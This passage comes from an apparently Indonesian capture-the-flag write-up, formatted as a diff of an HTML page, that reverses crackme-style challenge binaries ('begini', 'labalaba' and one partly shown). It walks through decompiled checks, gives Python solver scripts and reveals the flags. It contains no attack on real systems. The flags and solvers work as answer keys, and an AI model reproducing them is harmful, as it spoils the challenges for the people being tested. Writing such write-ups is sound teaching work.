+</span></span><span class="line"><span class="cl">    <span class="n">v15</span> <span class="o">=</span> <span class="mi">26</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v16</span> <span class="o">=</span> <span class="nf">sys_write</span><span class="p">(</span><span class="mi">2u</span><span class="p">,</span> <span class="n">v14</span><span class="p">,</span> <span class="n">v15</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v17</span> <span class="o">=</span> <span class="nf">sys_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>1. Validasi Argumen</strong></p>
+<p>ELF binary meminta 1 argumen sebuah file untuk memvalidasi flag.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">retaddr</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mi">2</span> <span class="p">)</span>  <span class="c1">// Cek argc == 2
+</span></span></span></code></pre></div></div>
+<p><strong>2. Proses Pembacaan File</strong></p>
+<p>Variabel <code>v9</code> adalah panjang karakter flag yang akan divalidasi.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">sys_open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span> <span class="c1">// Buka file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">sys_read</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x1Cu</span><span class="p">);</span>  <span class="c1">// Baca 0x1C = 28 bytes
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="n">v9</span> <span class="o">==</span> <span class="mi">27</span> <span class="p">)</span>            <span class="c1">// Harus tepat 27 bytes / 27 karakter
+</span></span></span></code></pre></div></div>
+<ol start="3">
+<li>Validasi Flag / Dekripsi Kunci</li>
+</ol>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">26</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">95</span> <span class="o">!=</span> <span class="n">aErrorOpeningFi</span><span class="p">[</span><span class="mi">45</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">LABEL_11</span><span class="p">;</span>  <span class="c1">// Salah!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></div></div>
+<p>Berarti formula untuk decrypt seperti ini:</p>
+<p><code>buf[i] - 95 == aErrorOpeningFi[45 + i]</code></p>
+<p>Dan untuk mendapatkan flagnya seperti ini:</p>
+<p><code>flag[i] = aErrorOpeningFi[45 + i] + 95</code></p>
+<p>Berikut adalah inspeksi pada array <code>aErrorOpeningFi</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">00000000004011</span><span class="n">CA</span> <span class="p">;</span> <span class="kt">char</span> <span class="n">aErrorOpeningFi</span><span class="p">[</span><span class="mi">47</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">00000000004011</span><span class="n">CA</span> <span class="n">aErrorOpeningFi</span> <span class="n">db</span> <span class="err">&#39;</span><span class="n">Error</span> <span class="n">opening</span> <span class="n">file</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">00000000004011</span><span class="n">CA</span>                                         <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="nl">start</span><span class="p">:</span><span class="n">loc_40018F</span><span class="err">↑</span><span class="n">o</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">00000000004011</span><span class="n">DD</span>                 <span class="n">db</span> <span class="err">&#39;</span><span class="n">Oops</span><span class="p">,</span> <span class="n">flagnya</span> <span class="n">masih</span> <span class="n">salah</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span><span class="n">Ah</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">00000000004011F</span><span class="mi">7</span>                 <span class="n">db</span> <span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="n">Dh</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">00000000004011F</span><span class="mi">9</span>                 <span class="n">db</span>    <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">00000000004011F</span><span class="n">A</span>                 <span class="n">db</span>    <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">00000000004011F</span><span class="n">B</span>                 <span class="n">db</span>  <span class="mi">1</span><span class="n">Ch</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">00000000004011F</span><span class="n">C</span>                 <span class="n">db</span>  <span class="mi">0</span><span class="n">Eh</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">00000000004011F</span><span class="n">D</span>                 <span class="n">db</span>    <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">00000000004011F</span><span class="n">E</span>                 <span class="n">db</span>  <span class="mf">0F</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">00000000004011FF</span>                 <span class="n">db</span>    <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401200</span>                 <span class="n">db</span>  <span class="mi">0</span><span class="n">Ah</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401201</span>                 <span class="n">db</span>  <span class="mf">0F</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401202</span>                 <span class="n">db</span>    <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401203</span>                 <span class="n">db</span>    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401204</span>                 <span class="n">db</span>  <span class="mi">0</span><span class="n">Eh</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401205</span>                 <span class="n">db</span>    <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401206</span>                 <span class="n">db</span>  <span class="mf">0F</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401207</span>                 <span class="n">db</span>  <span class="mi">0</span><span class="n">Ah</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">000000000040120</span><span class="mi">8</span>                 <span class="n">db</span>    <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">000000000040120</span><span class="mi">9</span>                 <span class="n">db</span>    <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">000000000040120</span><span class="n">A</span>                 <span class="n">db</span>  <span class="mi">0</span><span class="n">Eh</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">000000000040120</span><span class="n">B</span>                 <span class="n">db</span>    <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">000000000040120</span><span class="n">C</span>                 <span class="n">db</span>  <span class="mf">0F</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">000000000040120</span><span class="n">D</span>                 <span class="n">db</span>  <span class="mi">15</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">000000000040120</span><span class="n">E</span>                 <span class="n">db</span>    <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mf">000000000040120F</span>                 <span class="n">db</span>  <span class="mi">11</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LOAD</span><span class="p">:</span><span class="mo">0000000000401210</span>                 <span class="n">db</span>  <span class="mi">1</span><span class="n">Eh</span></span></span></code></pre></div></div>
+<p>Setelah dilakukan percobaan dekripsi menggunakan array <code>aErrorOpeningFi</code>, terdapat string yang menyusun flag seperti berikut:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>flag[0] = 7 + 95 = 102 = &#39;f&#39;
+flag[1] = 13 + 95 = 108 = &#39;l&#39;
+flag[2] = 6 + 95 = 101 = &#39;a&#39;
+flag[3] = 12 + 95 = 107 = &#39;g&#39;
+flag[4] = 28 + 95 = 123 = &#39;{&#39;</code></pre></div>
+<p>Oke, langsung saja berikut adalah final solver script:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Filename: solver.py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">encrypted</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">	<span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x1E</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">encrypted</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">byte</span> <span class="o">+</span> <span class="mi">95</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag --&gt; </span><span class="si">{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<h3 id="flag-1">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>flag{mancing_mania_mantap}</code></div>
+        </div>
+    </div>
+<h2 id="3-begini">3. begini</h2>
+<h3 id="deskripsi-2">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Download filenya di bawah</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-2">Langkah Penyelesaian</h3>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Decompile EXE file dengan IDA → ambil encrypted key → decrypt key sesuai algoritma.</div>
+        </div>
+    </div>
+<p>Berikut adalah hasil dekompilasi EXE file:</p>
+<p><code>chall_decompiled.cxx</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cpp">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">__noreturn</span> <span class="nf">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">UINT</span> <span class="n">PrivateProfileIntA</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">GetModuleFileNameA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">FileName</span><span class="p">,</span> <span class="mh">0x104u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="n">lstrlenA</span><span class="p">(</span><span class="n">FileName</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">lstrcpyA</span><span class="p">(</span><span class="o">&amp;</span><span class="n">FileName</span><span class="p">[</span><span class="n">v2</span><span class="p">],</span> <span class="n">String2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">PrivateProfileIntA</span> <span class="o">=</span> <span class="n">GetPrivateProfileIntA</span><span class="p">(</span><span class="n">AppName</span><span class="p">,</span> <span class="n">KeyName</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">FileName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sub_140001000</span><span class="p">(</span><span class="n">aOopsJikaTidakH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">PrivateProfileIntA</span> <span class="o">!=</span> <span class="mi">666</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sub_140001000</span><span class="p">(</span><span class="n">aOopsMasihSalah</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1A</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">102</span> <span class="o">-</span> <span class="n">dword_140002050</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">MessageBoxA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">Text</span><span class="p">,</span> <span class="n">aIdsecconf2025_1</span><span class="p">,</span> <span class="mh">0x40u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>Dari kode dekompilasi di atas, berikut adalah algoritma validasi / dekripsi key.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1A</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">102</span> <span class="o">-</span> <span class="n">dword_140002050</span><span class="p">[</span><span class="n">i</span><span class="p">];</span></span></span></code></pre></div></div>
+<p>Berikut adalah encrypted key dari array <code>dword_140002050</code> (array 26 nilai encrypted / 0x1A).</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mo">0000000140002050</span> <span class="n">dword_140002050</span> <span class="n">dd</span>
+</span></span><span class="line"><span class="cl"><span class="mi">234</span><span class="n">h</span><span class="p">,</span> <span class="mi">22</span><span class="n">Eh</span><span class="p">,</span> <span class="mi">239</span><span class="n">h</span><span class="p">,</span> <span class="mi">233</span><span class="n">h</span><span class="p">,</span> <span class="mf">21F</span><span class="n">h</span><span class="p">,</span> <span class="mi">237</span><span class="n">h</span><span class="p">,</span> <span class="mi">22</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">226</span><span class="n">h</span><span class="p">,</span> <span class="mi">22</span><span class="n">Bh</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mo">0000000140002050</span>                                         
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mo">0000000140002074</span>                 <span class="n">dd</span>
+</span></span><span class="line"><span class="cl"><span class="mi">23</span><span class="n">Bh</span><span class="p">,</span> <span class="mf">22F</span><span class="n">h</span><span class="p">,</span> <span class="mi">22</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">22</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">228</span><span class="n">h</span><span class="p">,</span> <span class="mi">22</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">23</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">22</span><span class="n">Ah</span><span class="p">,</span> <span class="mi">239</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">rdata</span><span class="p">:</span><span class="mo">00000001400020</span><span class="mi">98</span>                 <span class="n">dd</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span> <span class="nf">dup</span><span class="p">(</span><span class="mi">22</span><span class="n">Eh</span><span class="p">),</span> <span class="mi">225</span><span class="n">h</span><span class="p">,</span> <span class="mi">238</span><span class="n">h</span><span class="p">,</span> <span class="mi">239</span><span class="n">h</span><span class="p">,</span> <span class="mi">227</span><span class="n">h</span><span class="p">,</span> <span class="mi">239</span><span class="n">h</span><span class="p">,</span> <span class="mi">21</span><span class="n">Dh</span></span></span></code></pre></div></div>
+<p>Karena data yang dibutuhkan sudah diperoleh, termasuk dword / key-nya. Langsung saja craft solver script dan berikut adalah full solver script:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">encrypted</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">	<span class="mi">564</span><span class="p">,</span> <span class="mi">558</span><span class="p">,</span> <span class="mi">569</span><span class="p">,</span> <span class="mi">563</span><span class="p">,</span> <span class="mi">543</span><span class="p">,</span> <span class="mi">567</span><span class="p">,</span> <span class="mi">555</span><span class="p">,</span> <span class="mi">550</span><span class="p">,</span> <span class="mi">555</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="mi">571</span><span class="p">,</span> <span class="mi">559</span><span class="p">,</span> <span class="mi">555</span><span class="p">,</span> <span class="mi">556</span><span class="p">,</span> <span class="mi">552</span><span class="p">,</span> <span class="mi">555</span><span class="p">,</span> <span class="mi">571</span><span class="p">,</span> <span class="mi">554</span><span class="p">,</span> <span class="mi">569</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="mi">558</span><span class="p">,</span> <span class="mi">558</span><span class="p">,</span> <span class="mi">549</span><span class="p">,</span> <span class="mi">568</span><span class="p">,</span> <span class="mi">569</span><span class="p">,</span> <span class="mi">551</span><span class="p">,</span> <span class="mi">569</span><span class="p">,</span> <span class="mi">541</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">enc</span> <span class="ow">in</span> <span class="n">encrypted</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Formula: -102 - enc, then wrap to 8-bit (mod 256)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="mi">102</span> <span class="o">-</span> <span class="n">enc</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
+</span></span><span class="line"><span class="cl">  <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag --&gt; </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<h3 id="flag-2">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>flag{coto_konro_pallubasa}</code></div>
+        </div>
+    </div>
+<h2 id="4-labalaba">4. labalaba</h2>
+<h3 id="deskripsi-3">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Download filenya di bawah</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian-3">Langkah Penyelesaian</h3>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Ambil symbols dari Golang ELF Binary dengan tool <code>GoReSym</code> → Jalankan plugin <code>goresym_rename.py</code> di Ghidra → Analisis fungsi <code>main.main</code> dan <code>main.flag</code> untuk mendapatkan algoritma dekripsi kunci → Dekripsi key -&gt; Profit!.</div>
+        </div>
+    </div>
+<p>Pertama, saya coba cek file dan dekompilasi ELF binary tersebut. Ternyata file tersebut ELF binary Golang. Berikut adalah versi Golang.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strings laba-laba
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl">1.25.3</span></span></code></pre></div></div>
